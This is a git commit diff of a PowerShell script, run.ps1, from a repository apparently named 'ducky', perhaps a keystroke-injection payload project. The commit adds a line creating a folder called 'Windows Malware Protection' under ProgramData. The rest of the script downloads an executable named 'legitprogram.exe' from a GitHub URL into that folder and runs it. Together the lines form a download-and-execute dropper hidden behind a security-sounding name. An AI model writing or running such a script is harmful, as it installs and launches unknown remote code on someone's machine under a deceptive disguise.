41e5f23ee93fd3d6136cce55293cd7ed5173885b
Nooble <kieranaslett@gmail.com>
2019-02-04 19:43:22 +0000

    asdfasdfasdf

--- run.ps1
+++ run.ps1
@@ -1,2 +1,3 @@
+New-Item -Path "C:\ProgramData\Windows Malware Protection" -ItemType directory
 Invoke-WebRequest https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/legitprogram.exe -OutFile "C:\ProgramData\Windows Malware Protection\legitprogram.exe"
 Start-Process 'C:\ProgramData\Windows Malware Protection\legitprogram.exe'
